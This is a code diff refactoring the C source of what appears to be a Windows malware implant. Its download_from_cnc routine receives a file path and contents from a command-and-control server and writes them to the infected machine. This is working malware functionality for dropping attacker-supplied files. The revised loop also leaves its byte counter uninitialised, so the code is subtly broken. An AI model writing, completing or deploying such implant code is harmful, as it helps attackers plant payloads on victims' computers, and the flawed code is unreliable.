@@ -6,10 +6,25 @@
 #define FILESIZE_BUFFSIZE 8
 #define FILECONTENT_BUFFSIZE 8192
 
-HANDLE get_file() {
+long get_file_size() {
+  char* file_size_buf = recv_from_cnc(FILESIZE_BUFFSIZE);
+  long file_size = *(long*)file_size_buf;
+  free(file_size_buf);
+  return file_size;
+}
+
+unsigned long get_bufsize(unsigned long file_size, unsigned long bytes_read) {
+  unsigned long to_be_read = file_size - bytes_read;
+  if (to_be_read < FILECONTENT_BUFFSIZE) {
+    return to_be_read;
+  } else {
+    return FILECONTENT_BUFFSIZE;
+  }
+}
+
+HANDLE open_uploaded_file() {
   HANDLE file;
   char* path = recv_from_cnc(PATH_BUFFSIZE);
-  printf("File path: %s\n", path);
   file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW,
                      FILE_ATTRIBUTE_NORMAL, NULL);
   free(path);
@@ -17,31 +32,20 @@ HANDLE get_file() {
 }
 
 void recv_into_file(HANDLE file) {
-  char* file_size_buf = recv_from_cnc(FILESIZE_BUFFSIZE);
-  long file_size = *(long*)file_size_buf;
-  free(file_size_buf);
-  long bytes_read = 0;
-  long bytes_written = 0;
-  int reading = 0;
+  unsigned long bytes_read, bytes_written, to_be_read, bufsize, file_size;
   char* buf;
+  file_size = get_file_size();
   while (bytes_read < file_size) {
-    long to_be_read = file_size - bytes_read;
-    if (to_be_read < FILECONTENT_BUFFSIZE) {
-      reading = to_be_read;
-      buf = recv_from_cnc(to_be_read);
-      bytes_read += to_be_read;
-    } else {
-      buf = recv_from_cnc(FILECONTENT_BUFFSIZE);
-      reading = FILECONTENT_BUFFSIZE;
-      bytes_read += FILECONTENT_BUFFSIZE;
-    }
-    WriteFile(file, buf, reading, &bytes_written, NULL);
+    bufsize = get_bufsize(file_size, bytes_read);
+    buf = recv_from_cnc(bufsize);
+    WriteFile(file, buf, bufsize, &bytes_written, NULL);
     free(buf);
+    bytes_read += bufsize;
   }
-  CloseHandle(file);
 }
 
 void download_from_cnc() {
-  HANDLE file = get_file();
+  HANDLE file = open_uploaded_file();
   recv_into_file(file);
+  CloseHandle(file);
 }
